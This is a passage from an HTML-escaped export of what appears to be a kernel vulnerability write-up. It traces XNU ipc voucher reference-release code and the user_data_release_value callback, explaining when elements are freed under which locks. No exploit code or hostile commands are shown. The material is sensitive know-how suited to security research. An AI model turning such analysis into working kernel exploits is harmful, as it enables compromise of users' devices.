class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;goto&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_releasing &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;else&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Note that we enter this snippet with the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock held. The &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace-&amp;gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;values are read under that lock, then the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock is dropped and the attribute managers &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;release_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;callback is called:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.878791384d9e68560db9fcecd2cc8d16dddfac08\"&gt;&lt;/a&gt;&lt;a id=\"t.45\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_release_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Here&amp;#39;s the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam_release_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;callback:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3ccebbb1131353580cda71b6754e18fb5fd88dab\"&gt;&lt;/a&gt;&lt;a id=\"t.46\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_release_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;__assert_only manager&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __assert_only key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_reference_t &amp;nbsp; &amp;nbsp; sync&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_manager &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;manager&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; USER_DATA_ASSERT_KEY&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_element_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;sync &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_remove&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_bucket&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;],&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;sync &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_FAILURE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Under the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock (via &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_lock()&lt;/span&gt;&lt;span&gt;) the code checks whether the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;equal&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;value passed in. Looking back at the caller, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;. If and only if those values are equal does this method remove the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the hashtable and free it (via &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;kfree&lt;/span&gt;&lt;span&gt;) before returning success. If &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;sync&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t equal to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;, this method returns &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Having looked at the semantics of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_free_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;let&amp;#39;s look back at the callsite:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.900b61ea9371ab65b27de652c8f9e5e6230baf4e\"&gt;&lt;/a&gt;&lt;a id=\"t.47\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;redrive&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(!&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_free&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span 